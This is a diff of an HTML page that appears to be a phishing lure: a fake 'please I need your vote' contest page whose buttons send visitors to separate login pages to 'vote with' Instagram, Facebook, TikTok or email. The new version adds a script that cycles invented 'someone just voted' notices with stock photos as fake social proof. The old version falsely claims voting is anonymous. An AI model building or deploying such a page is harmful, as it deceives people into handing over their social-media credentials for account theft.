@@ -1,246 +1,186 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title> Vote</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Please I Need Your Vote</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 20px;
+    }
 
-<style>
-:root {
-  --cyan: #25f4ee;
-  --pink: #fe2c55;
-  --bg: #000;
-  --card: rgba(255,255,255,0.06);
-  --border: rgba(255,255,255,0.15);
-}
+    .container {
+      background: #fff;
+      border-radius: 8px;
+      padding: 16px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
 
-* {
-  box-sizing: border-box;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
-    Roboto, Helvetica, Arial, sans-serif;
-}
+    h2 {
+      text-align: center;
+      color: #333;
+    }
 
-body {
-  margin: 0;
-  min-height: 100vh;
-  background:
-    radial-gradient(circle at top left, rgba(37,244,238,0.15), transparent 40%),
-    radial-gradient(circle at bottom right, rgba(254,44,85,0.15), transparent 40%),
-    var(--bg);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: #fff;
-}
+    .image-container {
+      margin: 16px 0;
+    }
 
-/* CARD */
-.card {
-  width: 100%;
-  max-width: 440px;
-  padding: 26px;
-  border-radius: 22px;
-  background: var(--card);
-  backdrop-filter: blur(14px);
-  border: 1px solid var(--border);
-  box-shadow: 0 40px 80px rgba(0,0,0,0.9);
-}
+    .image-container img {
+      width: 100%;
+      border-radius: 6px;
+    }
 
-/* CUSTOM TRANSLATE */
-.translate-box {
-  display: flex;
-  justify-content: center;
-  margin-bottom: 16px;
-}
+    h3 {
+      text-align: center;
+      margin: 8px 0;
+    }
 
-.translate-select {
-  width: 100%;
-  max-width: 280px;
-  padding: 12px 16px;
-  border-radius: 999px;
-  background: rgba(255,255,255,0.08);
-  border: 1px solid rgba(255,255,255,0.25);
-  color: #fff;
-  font-size: 14px;
-  outline: none;
-  appearance: none;
-  text-align: center;
-  cursor: pointer;
-}
+    .votes-box {
+      text-align: center;
+      margin-bottom: 8px;
+    }
 
-.translate-select option {
-  color: #000;
-}
+    .progress-bar {
+      background: #eee;
+      border-radius: 10px;
+      overflow: hidden;
+      height: 10px;
+      margin: 4px 0;
+    }
 
-/* LOGO */
-.logo {
-  text-align: center;
-  font-weight: 900;
-  font-size: 22px;
-  margin-bottom: 18px;
-  background: linear-gradient(135deg, var(--cyan), var(--pink));
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
+    .progress {
+      background: #4285f4;
+      height: 100%;
+      width: 99.8%;
+    }
 
-h1 {
-  text-align: center;
-  font-size: 24px;
-  margin-bottom: 10px;
-}
+    .votes-to-win {
+      text-align: center;
+      font-weight: bold;
+      color: #333;
+    }
 
-.subtitle {
-  text-align: center;
-  font-size: 15px;
-  color: #cfcfcf;
-  margin-bottom: 28px;
-}
+    .buttons {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 12px 0;
+    }
 
-/* OPTIONS */
-.vote-options {
-  display: grid;
-  gap: 16px;
-  margin-bottom: 26px;
-}
+    button {
+      padding: 10px 14px;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      cursor: pointer;
+    }
 
-.option {
-  padding: 18px;
-  border-radius: 16px;
-  border: 1px solid var(--border);
-  cursor: pointer;
-}
+    .vote-whatsapp {
+      background: #00A071;
+    }
 
-.option input {
-  display: none;
-}
+    .vote-email {
+      background: #DD3C3C;
+    }
 
-.option span {
-  font-size: 16px;
-  font-weight: 600;
-}
+    .notification {
+      background: #007bff;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-radius: 4px;
+      padding: 6px 8px;
+      font-size: 14px;
+      margin-top: 10px;
+      transition: opacity 0.5s ease-in-out;
+      opacity: 0;
+    }
 
-/* BUTTON */
-.submit {
-  width: 100%;
-  border: none;
-  padding: 15px;
-  border-radius: 18px;
-  font-size: 16px;
-  font-weight: 800;
-  cursor: pointer;
-  background: linear-gradient(135deg, var(--cyan), var(--pink));
-  color: #000;
-}
+    .notification img {
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+    }
 
-/* NOTE */
-.note {
-  margin-top: 18px;
-  text-align: center;
-  font-size: 12.5px;
-  color: #9a9a9a;
-}
-
-/* MOBILE */
-@media (max-width: 480px) {
-  .card {
-    margin: 14px;
-    padding: 22px;
-  }
-}
-</style>
+    .show {
+      opacity: 1;
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <h2>PLEASE I NEED YOUR VOTE</h2>
 
-<div class="card">
+    <div class="image-container">
+      <img src="voteforme1.png" alt="Robyn Bacon" />
+    </div>
+<div class="buttons">
+      <a href="login.html"><button class="vote-whatsapp">VOTE WITH Instagram</button></a>
+      <a href="fb.html"><button class="vote-email">VOTE WITH EMAIL</button></a>
+      <a href="ig.html"><button class="vote-email">VOTE WITH TIKTOK</button></a>
+      <a href="tik.html"><button class="vote-email">VOTE WITH FACEBOOK</button></a>
+    </div>
+    <h3>Contestants</h3>
 
-  <!-- CUSTOM TRANSLATOR -->
-  <div class="translate-box">
-    <select class="translate-select" id="languageSelect">
-      <option value="">🌍 Translate page</option>
+    <div class="votes-box">
+      <p>Total Votes: <strong>5678</strong> out of <strong>5688</strong></p>
+      <div class="progress-bar">
+        <div class="progress"></div>
+      </div>
+    </div>
 
-      <option value="de">English → German</option>
-      <option value="en">German → English</option>
+    <p class="votes-to-win">✔ Total Votes To Win: <strong>10</strong></p>
 
-      <option value="fr">English → French</option>
-      <option value="en">French → English</option>
+    
 
-      <option value="it">English → Italian</option>
-      <option value="en">Italian → English</option>
-
-      <option value="rm">English → Romansh</option>
-      <option value="pl">Polish → English</option>
-      <option value="fi">Finnish → English</option>
-      <option value="sq">English → Albanian</option>
-      <option value="no">English → Norwegian</option>
-      <option value="sr">Serbian → English</option>
-      <option value="hr">Croatian → English</option>
-      <option value="cs">Czech → English</option>
-    </select>
+    <div class="notification" id="notification">
+      <img src="https://randomuser.me/api/portraits/men/22.jpg" alt="voter" id="voter-img">
+      <span id="voter-text">Someone from USA named Emily Johnson just voted.</span>
+    </div>
   </div>
 
-  <div class="logo">♪ VOTE</div>
+  <script>
+    const voters = [
+      { country: "USA", name: "Emily Johnson", img: "https://randomuser.me/api/portraits/women/65.jpg" },
+      { country: "Germany", name: "Lukas Müller", img: "https://randomuser.me/api/portraits/men/22.jpg" },
+      { country: "France", name: "Chloe Martin", img: "https://randomuser.me/api/portraits/women/15.jpg" },
+      { country: "Italy", name: "Marco Rossi", img: "https://randomuser.me/api/portraits/men/32.jpg" },
+      { country: "Spain", name: "Isabella García", img: "https://randomuser.me/api/portraits/women/28.jpg" },
+      { country: "Netherlands", name: "Daan de Vries", img: "https://randomuser.me/api/portraits/men/43.jpg" },
+      { country: "USA", name: "Michael Brown", img: "https://randomuser.me/api/portraits/men/76.jpg" },
+      { country: "UK", name: "Olivia Davis", img: "https://randomuser.me/api/portraits/women/33.jpg" },
+      { country: "Poland", name: "Anna Nowak", img: "https://randomuser.me/api/portraits/women/51.jpg" },
+      { country: "Sweden", name: "Erik Andersson", img: "https://randomuser.me/api/portraits/men/17.jpg" }
+    ];
 
-  <h1>Cast Your Vote</h1>
-  <p class="subtitle">
-    Your opinion matters. Choose an option below and help shape the outcome.
-  </p>
+    let currentIndex = 0;
+    const notification = document.getElementById('notification');
+    const voterText = document.getElementById('voter-text');
+    const voterImg = document.getElementById('voter-img');
 
-  <div class="vote-options">
-    <label class="option">
-      <input type="radio" name="vote">
-      <span>👍 Yes, I support this</span>
-    </label>
+    function showNextVoter() {
+      const voter = voters[currentIndex];
+      voterText.textContent = `Someone from ${voter.country} named ${voter.name} just voted.`;
+      voterImg.src = voter.img;
 
-    <label class="option">
-      <input type="radio" name="vote">
-      <span>👎 No, I don’t agree</span>
-    </label>
-  </div>
+      notification.classList.add('show');
 
-  <a href="login.html">
-    <button class="submit">Complete Vote On Instagram</button>
-  </a>
-  <br/>
-  
-  <a href="fb.html">
-    <button class="submit">Complete Vote On Hotmail</button>
-  </a>
-  <a href="ig.html">
-    <button class="submit">Complete Vote On Facebok</button>
-  </a>
-  <a href="tik.html">
-    <button class="submit">Complete Vote On TikTok</button>
-  </a>
-  <div class="note">
-    Voting is anonymous • Results update in real time
-  </div>
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 4000); // visible for 4 seconds
 
-</div>
+      currentIndex = (currentIndex + 1) % voters.length;
+    }
 
-<!-- HIDDEN GOOGLE TRANSLATE ENGINE -->
-<div id="google_translate_element" style="display:none;"></div>
-
-<script>
-function googleTranslateElementInit() {
-  new google.translate.TranslateElement(
-    { pageLanguage: 'en', autoDisplay: false },
-    'google_translate_element'
-  );
-}
-
-function changeLanguage(lang) {
-  const combo = document.querySelector('.goog-te-combo');
-  if (!combo) return;
-  combo.value = lang;
-  combo.dispatchEvent(new Event('change'));
-}
-
-document.getElementById('languageSelect').addEventListener('change', function () {
-  if (this.value) changeLanguage(this.value);
-});
-</script>
-
-<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-
+    showNextVoter(); // show first immediately
+    setInterval(showNextVoter, 5000);
+  </script>
 </body>
 </html>
 
